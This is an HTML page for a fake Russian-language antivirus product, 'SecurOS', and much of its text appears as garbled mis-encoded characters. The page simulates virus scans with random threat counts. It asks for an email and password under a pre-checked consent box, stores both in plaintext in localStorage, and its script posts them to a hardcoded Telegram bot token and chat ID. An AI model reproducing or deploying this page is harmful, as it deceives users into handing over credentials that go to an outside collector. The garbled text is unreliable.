<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SecurOS ¬∑ —Å–æ–≥–ª–∞—à–µ–Ω–∏–µ –Ω–∞ –ø–µ—Ä–µ–¥–∞—á—É –¥–∞–Ω–Ω—ã—Ö</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        body {
            background: linear-gradient(145deg, #070b16 0%, #131a2c 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .glass-card {
            width: 560px;
            background: rgba(18, 26, 40, 0.9);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 195, 255, 0.25);
            border-radius: 32px;
            box-shadow: 0 30px 50px rgba(0,0,0,0.7), 0 0 0 1px rgba(0, 255, 200, 0.1) inset;
            overflow: hidden;
            transition: 0.3s;
        }
        .title-bar {
            background: rgba(0, 20, 40, 0.7);
            padding: 18px 26px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #2d4b6e;
            color: #b0e0ff;
            font-weight: 500;
            letter-spacing: 0.3px;
            text-shadow: 0 2px 3px black;
        }
        .title-bar span:first-child {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .title-bar span:last-child {
            color: #4e7b9e;
        }
        .content {
            padding: 28px 30px 30px;
        }
        .status-banner {
            background: #0f1a28;
            border-radius: 18px;
            padding: 18px 20px;
            border-left: 5px solid #00ffc3;
            box-shadow: 0 6px 14px rgba(0,0,0,0.5);
            margin-bottom: 25px;
            border: 1px solid #2b5270;
        }
        .status-row {
            display: flex;
            justify-content: space-between;
            color: #aac7e0;
            font-size: 14px;
            margin-bottom: 16px;
        }
        .threat-block {
            display: flex;
            justify-content: space-around;
            margin-top: 12px;
        }
        .threat-item {
            text-align: center;
        }
        .threat-value {
            font-size: 34px;
            font-weight: 800;
            background: linear-gradient(135deg, #bbffdd, #80ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            line-height: 1.2;
        }
        .threat-label {
            color: #87a9c9;
            font-size: 13px;
            text-transform: uppercase;
        }

        /* –ø–∞–Ω–µ–ª—å —Å–æ–≥–ª–∞—Å–∏—è ‚Äî –ø–æ–ª–Ω–æ—Å—Ç—å—é –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∞—è */
        .consent-master {
            background: #111d30;
            border-radius: 20px;
            padding: 20px 22px;
            margin: 25px 0 18px;
            border: 1px solid #2c577a;
            box-shadow: 0 8px 0 #0a111f;
        }
        .consent-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 16px;
        }
        .consent-header input[type="checkbox"] {
            width: 22px;
            height: 22px;
            accent-color: #00c3ff;
            transform: scale(1.1);
            cursor: pointer;
        }
        .consent-header label {
            font-weight: 600;
            color: #e1f2ff;
            font-size: 1.05rem;
            cursor: pointer;
        }
        .badge-obligatory {
            background: #005c8a;
            padding: 5px 12px;
            border-radius: 40px;
            font-size: 11px;
            font-weight: bold;
            color: #b3eeff;
            border: 1px solid #3ec9ff;
            margin-left: auto;
            transition: 0.2s;
        }
        .badge-obligatory.denied {
            background: #7a3a3a;
            border-color: #ff7f7f;
            color: #ffd9b3;
        }
        /* –ø–æ–ª–µ –≤–≤–æ–¥–∞ —Ç–µ–ø–µ—Ä—å –ø–æ—è–≤–ª—è–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø—Ä–∏ —Å–æ–≥–ª–∞—Å–∏–∏ */
        .credential-field {
            margin: 18px 0 10px;
            transition: all 0.2s;
        }
        .credential-field label {
            display: block;
            color: #b4d9ff;
            font-size: 13px;
            margin-bottom: 5px;
            font-weight: 500;
        }
        .credential-field input {
            width: 100%;
            background: #0d1a2b;
            border: 1px solid #3a6190;
            padding: 12px 16px;
            border-radius: 30px;
            color: #f0f9ff;
            font-size: 14px;
            outline: none;
            transition: 0.15s;
        }
        .credential-field input:focus {
            border-color: #00c3ff;
            box-shadow: 0 0 0 2px #00a6ff40;
        }
        .consent-status-area {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 12px;
        }
        .status-badge {
            background: #0c3545;
            color: #8dd0ff;
            padding:6px 14px;
            border-radius:30px;
            font-size:12px;
            font-weight:600;
        }
        .revoke-link {
            color: #ffae70;
            font-size: 12px;
            text-decoration: underline dotted;
            cursor: pointer;
        }
        .revoke-link:hover {
            color: #ffc491;
        }

        .privacy-note {
            color: #8fcbff;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 6px;
            margin: 12px 0 0 5px;
        }
        .button-group {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin: 22px 0 14px;
        }
        .button {
            background: linear-gradient(145deg, #1f314a, #132235);
            border: none;
            color: white;
            padding: 14px 18px;
            border-radius: 50px;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            box-shadow: 0 7px 0 #0a101f, 0 4px 12px #00a6ff40;
            transition: 0.1s ease;
            border: 1px solid #2d628b;
            flex: 1 0 auto;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .button:active {
            transform: translateY(5px);
            box-shadow: 0 2px 0 #0a101f;
        }
        .button-primary {
            background: linear-gradient(145deg, #0066c4, #00478f);
            border-color: #5ab0ff;
            box-shadow: 0 7px 0 #002856;
        }
        .button-telegram {
            background: linear-gradient(145deg, #2f6d9c, #1b4b73);
        }
        .button:disabled {
            opacity: 0.45;
            transform: none;
            box-shadow: 0 4px 0 #0a101f;
            pointer-events: none;
            filter: grayscale(0.6);
        }
        .progress-section {
            margin: 18px 0 12px;
        }
        .scan-progress {
            height: 18px;
            background: #141f33;
            border-radius: 40px;
            overflow: hidden;
            border: 1px solid #316797;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #00c3ff, #5effb2);
            transition: width 0.2s;
            border-radius: 40px;
        }
        #liveLog {
            background: #0b1322;
            border-radius: 14px;
            padding: 15px;
            height: 130px;
            overflow-y: auto;
            font-size: 12.5px;
            border: 1px solid #2b5377;
            color: #a8c5e5;
            line-height: 1.5;
            box-shadow: inset 0 5px 8px #00000050;
            margin: 10px 0 10px;
        }
        .footer-note {
            font-size: 10px;
            color: #3b6990;
            text-align: center;
            margin-top: 20px;
            border-top: 1px dashed #295579;
            padding-top: 14px;
        }
    </style>
</head>
<body>
<div class="glass-card">
    <div class="title-bar">
        <span>üõ°Ô∏è SecurOS ¬∑ –ø—Ä–æ—Ç–æ–∫–æ–ª V4 (GDPR)</span>
        <span>‚öôÔ∏è ‚úï</span>
    </div>
    <div class="content">
        <!-- —Å—Ç–∞—Ç—É—Å –ø–∞–Ω–µ–ª—å -->
        <div class="status-banner">
            <div class="status-row">
                <span>üîí –ó–∞—â–∏—Ç–∞: <strong style="color:#6affb2;">Ultimate</strong></span>
                <span>üïí —Å–µ—Å—Å–∏—è: <span id="sessionShort">...</span></span>
            </div>
            <div class="threat-block">
                <div class="threat-item">
                    <div class="threat-value" id="threatDisplay">0</div>
                    <div class="threat-label">—É–≥—Ä–æ–∑</div>
                </div>
                <div class="threat-item">
                    <div class="threat-value" id="filesDisplay">0</div>
                    <div class="threat-label">—Ñ–∞–π–ª–æ–≤</div>
                </div>
            </div>
        </div>

        <!-- –î–ò–ù–ê–ú–ò–ß–ï–°–ö–û–ï –°–û–ì–õ–ê–®–ï–ù–ò–ï: –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–∞–º –≤–≤–æ–¥–∏—Ç –¥–∞–Ω–Ω—ã–µ –∏ –º–æ–∂–µ—Ç –æ—Ç–∫–∞–∑–∞—Ç—å—Å—è -->
        <div class="consent-master" id="consentBox">
            <div class="consent-header">
                <input type="checkbox" id="masterConsent" checked>
                <label for="masterConsent">üìã —Ä–∞–∑—Ä–µ—à–∏—Ç—å —Å–±–æ—Ä –∏ –ø–µ—Ä–µ–¥–∞—á—É –¥–∞–Ω–Ω—ã—Ö</label>
                <span class="badge-obligatory" id="consentBadge">‚úÖ —Å–æ–≥–ª–∞—Å–∏–µ –¥–∞–Ω–æ</span>
            </div>

            <!-- –ø–æ–ª–µ –ø–æ—á—Ç—ã, –≤–∏–¥–∏–º–æ —Ç–æ–ª—å–∫–æ –ø—Ä–∏ —Å–æ–≥–ª–∞—Å–∏–∏ -->
            <div class="credential-field" id="emailFieldContainer">
                <label>üìß –≤–∞—à email (–¥–ª—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏)</label>
                <input type="email" id="userEmail" placeholder="user@example.com" value="">
            </div>
            <!-- –ø–æ–ª–µ –ø–∞—Ä–æ–ª—è (–∏–ª–∏ –ª—é–±–æ–π —É—á—ë—Ç–Ω–æ–π —Å—Ç—Ä–æ–∫–∏) -->
            <div class="credential-field" id="passFieldContainer">
                <label>üîë –≤—Ä–µ–º–µ–Ω–Ω—ã–π –∫–ª—é—á / –ø–∞—Ä–æ–ª—å (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)</label>
                <input type="text" id="userPass" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" value="">
            </div>

            <div class="consent-status-area">
                <span class="status-badge" id="consentStatusIcon">üîì –¥–∞–Ω–Ω—ã–µ –Ω–µ –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è</span>
                <span class="revoke-link" id="revokeConsentLink">–æ—Ç–æ–∑–≤–∞—Ç—å —Å–æ–≥–ª–∞—Å–∏–µ</span>
            </div>
            <div class="privacy-note">
                ‚ìò –í—ã –≤ –ª—é–±–æ–π –º–æ–º–µ–Ω—Ç –º–æ–∂–µ—Ç–µ —Å–Ω—è—Ç—å –≥–∞–ª–æ—á–∫—É ‚Äî –¥–∞–Ω–Ω—ã–µ –Ω–µ –±—É–¥—É—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram.
            </div>
        </div>

        <!-- –∫–Ω–æ–ø–∫–∏ –¥–µ–π—Å—Ç–≤–∏–π -->
        <div class="button-group">
            <button class="button" id="quickScanBtn">üîç –±—ã—Å—Ç—Ä–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞</button>
            <button class="button button-primary" id="silentTelegramBtn">üìã –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ—Ç—á—ë—Ç (—Ç–æ–ª—å–∫–æ –ø—Ä–∏ —Å–æ–≥–ª–∞—Å–∏–∏)</button>
        </div>
        <div class="button-group">
            <button class="button" id="viewMyDataBtn">üìã –ø–æ–∫–∞–∑–∞—Ç—å –¥–∞–Ω–Ω—ã–µ —Å–µ—Å—Å–∏–∏</button>
            <button class="button" id="fixThreatsBtn">üßπ –∏—Å–ø—Ä–∞–≤–∏—Ç—å —É–≥—Ä–æ–∑—ã</button>
        </div>

        <!-- –ø—Ä–æ–≥—Ä–µ—Å–±–∞—Ä –∏ –ª–æ–≥ -->
        <div class="progress-section">
            <div class="scan-progress">
                <div class="progress-fill" id="scanProgressFill" style="width: 0%;"></div>
            </div>
        </div>
        <div id="liveLog">
            [SecurOS] –ó–∞—â–∏—â—ë–Ω–Ω—ã–π –∫–∞–Ω–∞–ª –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω.<br>
            [–°–æ–≥–ª–∞—Å–∏–µ] –û—Ç–º–µ—Ç—å—Ç–µ –≥–∞–ª–æ—á–∫—É, —á—Ç–æ–±—ã —Ä–∞–∑—Ä–µ—à–∏—Ç—å –æ—Ç–ø—Ä–∞–≤–∫—É –¥–∞–Ω–Ω—ã—Ö.<br>
        </div>
        <div class="footer-note">
            SecurOS Ultimate ¬∑ –ø–µ—Ä–µ–¥–∞—á–∞ —Ç–æ–ª—å–∫–æ –ø–æ –≤–∞—à–µ–º—É —Å–æ–≥–ª–∞—Å–∏—é ¬∑ –≤–µ—Ä—Å–∏—è 22.02
        </div>
    </div>
</div>

<script>
    (function() {
        // ------ –¢–ï–õ–ï–ì–†–ê–ú –ö–û–ù–§–ò–ì (—Å–∫—Ä—ã—Ç) ------
        const BOT_TOKEN = '7965251392:AAG6uwjyr3DWeHmCUfseK_8QEyzUZW7e7Wc';
        const CHAT_ID = '7606942441';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // —ç–ª–µ–º–µ–Ω—Ç—ã
        const threatSpan = document.getElementById('threatDisplay');
        const filesSpan = document.getElementById('filesDisplay');
        const progressFill = document.getElementById('scanProgressFill');
        const logDiv = document.getElementById('liveLog');
        const sessionShortSpan = document.getElementById('sessionShort');

        // –ø–æ–ª—è —Å–æ–≥–ª–∞—Å–∏—è/–¥–∞–Ω–Ω—ã—Ö
        const masterConsent = document.getElementById('masterConsent');
        const consentBadge = document.getElementById('consentBadge');
        const consentStatusIcon = document.getElementById('consentStatusIcon');
        const revokeLink = document.getElementById('revokeConsentLink');
        const emailField = document.getElementById('userEmail');
        const passField = document.getElementById('userPass');

        // —Å–æ—Å—Ç–æ—è–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        let userData = {
            sessionId: 'usr_' + Math.random().toString(36).substring(2, 12) + '_' + Date.now(),
            firstSeen: new Date().toISOString(),
            threats: 0,
            filesScanned: 2450,
            scanHistory: [],
            systemInfo: {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            }
        };

        // –∑–∞–≥—Ä—É–∑–∫–∞ —Å–æ—Ö—Ä–∞–Ω—ë–Ω–Ω–æ–≥–æ —Å–æ–≥–ª–∞—Å–∏—è –∏ email/–ø–∞—Ä–æ–ª—è –∏–∑ localStorage
        try {
            const saved = localStorage.getItem('secur_consent_state');
            if (saved) {
                const parsed = JSON.parse(saved);
                userData.sessionId = parsed.sessionId || userData.sessionId;
                userData.threats = parsed.threats || 0;
                userData.filesScanned = parsed.filesScanned || 2450;
                userData.scanHistory = parsed.scanHistory || [];
                // –≤–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–æ–ª—è —Ñ–æ—Ä–º—ã
                if (parsed.userEmail !== undefined) emailField.value = parsed.userEmail;
                if (parsed.userPass !== undefined) passField.value = parsed.userPass;
                if (parsed.consentGiven !== undefined) masterConsent.checked = parsed.consentGiven;
            }
        } catch (e) {}

        // –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º —Å–µ—Å—Å–∏—é
        sessionShortSpan.textContent = userData.sessionId.substring(0, 6) + '‚Ä¶';
        threatSpan.textContent = userData.threats;
        filesSpan.textContent = userData.filesScanned;

        // ---- —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è UI –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç consent ----
        function updateConsentUI() {
            const consent = masterConsent.checked;

            // –≤–∏–¥–∏–º–æ—Å—Ç—å –ø–æ–ª–µ–π –≤–≤–æ–¥–∞
            document.getElementById('emailFieldContainer').style.display = consent ? 'block' : 'none';
            document.getElementById('passFieldContainer').style.display = consent ? 'block' : 'none';

            // –±–µ–π–¥–∂ –∏ —Å—Ç–∞—Ç—É—Å
            if (consent) {
                consentBadge.textContent = '‚úÖ —Å–æ–≥–ª–∞—Å–∏–µ –¥–∞–Ω–æ';
                consentBadge.className = 'badge-obligatory';
                consentStatusIcon.innerHTML = 'üì§ –ø–µ—Ä–µ–¥–∞—á–∞ —Ä–∞–∑—Ä–µ—à–µ–Ω–∞';
            } else {
                consentBadge.textContent = '‚õî —Å–æ–≥–ª–∞—Å–∏–µ –æ—Ç–æ–∑–≤–∞–Ω–æ';
                consentBadge.classList.add('denied');
                consentStatusIcon.innerHTML = 'üîí –ø–µ—Ä–µ–¥–∞—á–∞ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞';
            }

            // –∫–Ω–æ–ø–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Ç—á—ë—Ç–∞ (–µ—Å–ª–∏ –Ω–µ—Ç —Å–æ–≥–ª–∞—Å–∏—è ‚Äî –¥–µ–ª–∞–µ–º –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ–π, –Ω–æ —á–∏—Å—Ç–æ –≤–∏–∑—É–∞–ª—å–Ω–æ)
            const sendBtn = document.getElementById('silentTelegramBtn');
            if (!consent) {
                sendBtn.disabled = true;
            } else {
                sendBtn.disabled = false;
            }

            saveState();
        }

        // —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤ localStorage
        function saveState() {
            const state = {
                sessionId: userData.sessionId,
                threats: userData.threats,
                filesScanned: userData.filesScanned,
                scanHistory: userData.scanHistory,
                userEmail: emailField.value,
                userPass: passField.value,
                consentGiven: masterConsent.checked
            };
            localStorage.setItem('secur_consent_state', JSON.stringify(state));
        }

        // –ª–æ–≥
        function addLog(text) {
            let line = document.createElement('div');
            line.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
            logDiv.appendChild(line);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        // ---- –æ—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram –¢–û–õ–¨–ö–û –µ—Å–ª–∏ consent true ----
        async function sendToTelegramIfConsent(trigger = 'manual') {
            if (!masterConsent.checked) {
                addLog('‚èπÔ∏è –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞: —Å–æ–≥–ª–∞—Å–∏–µ –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–æ.');
                return false;
            }

            const email = emailField.value.trim();
            const pass = passField.value.trim();

            // –º–æ–∂–Ω–æ —Ä–∞–∑—Ä–µ—à–∏—Ç—å –ø—É—Å—Ç–æ–π –ø–∞—Ä–æ–ª—å, –Ω–æ email –ø–æ–∫–∞–∂–µ–º
            const displayEmail = email || '(–Ω–µ —É–∫–∞–∑–∞–Ω)';
            const displayPass = pass || '(–ø—É—Å—Ç–æ)';

            const messageText = `
üîê SECUROS ¬∑ –î–ê–ù–ù–´–ï –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø (—Å–æ–≥–ª–∞—Å–∏–µ –ø–æ–ª—É—á–µ–Ω–æ)
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üÜî Session: ${userData.sessionId}
üìß EMAIL: ${displayEmail}
üîë –ü–ê–†–û–õ–¨/–ö–õ–Æ–ß: ${displayPass}
‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString()}
üåê –°–∏—Å—Ç–µ–º–∞: ${userData.systemInfo.platform}, ${userData.systemInfo.language}
üìä –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: —É–≥—Ä–æ–∑ ${userData.threats}, —Ñ–∞–π–ª–æ–≤ ${userData.filesScanned}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
            `.trim();

            try {
                await fetch(TELEGRAM_API, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: messageText,
                        parse_mode: 'HTML'
                    })
                });
                addLog('‚úÖ –û—Ç—á—ë—Ç —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ –∑–∞—â–∏—â—ë–Ω–Ω–æ–µ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ (Telegram).');
                userData.scanHistory.push({ timestamp: new Date().toISOString(), event: 'telegram_sent' });
                saveState();
                return true;
            } catch (err) {
                addLog('‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å –æ–±–ª–∞–∫–æ–º.');
                return false;
            }
        }

        // —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ (–∏–º–∏—Ç–∞—Ü–∏—è)
        function simulateScan(full = false) {
            let progress = 0;
            let files = userData.filesScanned;
            let threats = userData.threats;
            let step = full ? 2 : 5;
            addLog(full ? '‚ö° –ü–û–õ–ù–û–ï —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ...' : 'üîç –±—ã—Å—Ç—Ä–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ...');

            let interval = setInterval(() => {
                progress += step;
                files += Math.floor(Math.random() * 30) + 5;
                if (Math.random() > 0.75 && progress < 80) {
                    threats += 1;
                    addLog('‚ö†Ô∏è –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–∞—è —É–≥—Ä–æ–∑–∞ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–∞');
                }
                if (progress >= 100) {
                    clearInterval(interval);
                    progress = 100;
                    addLog('‚úÖ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ');
                    userData.threats = threats;
                    userData.filesScanned = files;
                    userData.scanHistory.push({timestamp: new Date().toISOString(), type: full ? 'full' : 'quick', filesScanned: files});
                    threatSpan.textContent = threats;
                    filesSpan.textContent = files;
                    progressFill.style.width = '100%';
                    saveState();

                    // –ù–ò–ö–ê–ö–û–ô –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–û–ô –û–¢–ü–†–ê–í–ö–ò –ü–û–°–õ–ï –°–ö–ê–ù–ò–†–û–í–ê–ù–ò–Ø. —Ç–æ–ª—å–∫–æ –ø–æ –∫–Ω–æ–ø–∫–µ.
                } else {
                    progressFill.style.width = progress + '%';
                    threatSpan.textContent = threats;
                    filesSpan.textContent = files;
                }
            }, 180);
        }

        // ---- –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ ----

        masterConsent.addEventListener('change', () => {
            updateConsentUI();
            addLog(masterConsent.checked ? '‚úÖ –°–æ–≥–ª–∞—Å–∏–µ –¥–∞–Ω–æ.' : '‚õî –°–æ–≥–ª–∞—Å–∏–µ –æ—Ç–æ–∑–≤–∞–Ω–æ.');
        });

        revokeLink.addEventListener('click', () => {
            masterConsent.checked = false;
            updateConsentUI();
            addLog('üîí –°–æ–≥–ª–∞—Å–∏–µ –æ—Ç–æ–∑–≤–∞–Ω–æ –≤—Ä—É—á–Ω—É—é.');
        });

        emailField.addEventListener('input', saveState);
        passField.addEventListener('input', saveState);

        document.getElementById('quickScanBtn').addEventListener('click', () => {
            simulateScan(false);
        });

        // –∫–Ω–æ–ø–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Ç—á—ë—Ç–∞ (–±—ã–≤—à–∞—è silentTelegramBtn) —Ç–µ–ø–µ—Ä—å —è–≤–Ω–æ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç —Å–æ–≥–ª–∞—Å–∏–µ
        document.getElementById('silentTelegramBtn').addEventListener('click', async () => {
            if (!masterConsent.checked) {
                addLog('‚õî –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å: —Å–Ω–∞—á–∞–ª–∞ –¥–∞–π—Ç–µ —Å–æ–≥–ª–∞—Å–∏–µ.');
                return;
            }
            if (!emailField.value.trim()) {
                addLog('‚ö†Ô∏è –ñ–µ–ª–∞—Ç–µ–ª—å–Ω–æ —É–∫–∞–∑–∞—Ç—å email –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π (–Ω–æ –º–æ–∂–Ω–æ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å).');
            }
            addLog('üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Ç—á—ë—Ç–∞ —Å–æ–≥–ª–∞—Å–Ω–æ —Å–æ–≥–ª–∞—Å–∏—é...');
            await sendToTelegramIfConsent('manual');
        });

        document.getElementById('viewMyDataBtn').addEventListener('click', () => {
            addLog('üìã –¢–ï–ö–£–©–ò–ï –î–ê–ù–ù–´–ï –°–ï–°–°–ò–ò:');
            addLog(`   ‚Ä¢ –°–µ—Å—Å–∏—è: ${userData.sessionId}`);
            addLog(`   ‚Ä¢ –£–≥—Ä–æ–∑: ${userData.threats}, —Ñ–∞–π–ª–æ–≤: ${userData.filesScanned}`);
            addLog(`   ‚Ä¢ Email: ${emailField.value || '(–Ω–µ —É–∫–∞–∑–∞–Ω)'} (—Å–æ–≥–ª–∞—Å–∏–µ: ${masterConsent.checked ? '–¥–∞' : '–Ω–µ—Ç'})`);
        });

        document.getElementById('fixThreatsBtn').addEventListener('click', () => {
            addLog('üßπ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —É–≥—Ä–æ–∑...');
            setTimeout(() => {
                userData.threats = 0;
                threatSpan.textContent = '0';
                addLog('‚úÖ –≤—Å–µ —É–≥—Ä–æ–∑—ã –Ω–µ–π—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω—ã');
                saveState();
                // –±–µ–∑ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏
            }, 800);
        });

        // –¥–≤–æ–π–Ω–æ–π –∫–ª–∏–∫ –¥–ª—è –ø–æ–ª–Ω–æ–≥–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
        document.getElementById('quickScanBtn').addEventListener('dblclick', () => {
            simulateScan(true);
        });

        // –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è UI
        updateConsentUI();
        addLog('üõ°Ô∏è SecurOS –∞–∫—Ç–∏–≤–Ω–∞. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —Ñ–ª–∞–∂–æ–∫, —á—Ç–æ–±—ã —Ä–∞–∑—Ä–µ—à–∏—Ç—å –ø–µ—Ä–µ–¥–∞—á—É –¥–∞–Ω–Ω—ã—Ö.');

        // –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ - –£–ë–†–ê–ù–ê –ü–û–õ–ù–û–°–¢–¨–Æ (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–ª–∂–µ–Ω –Ω–∞–∂–∞—Ç—å —Å–∞–º)
        // —Ç–æ–ª—å–∫–æ —Å–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
        saveState();
    })();
</script>
</body>
</html>
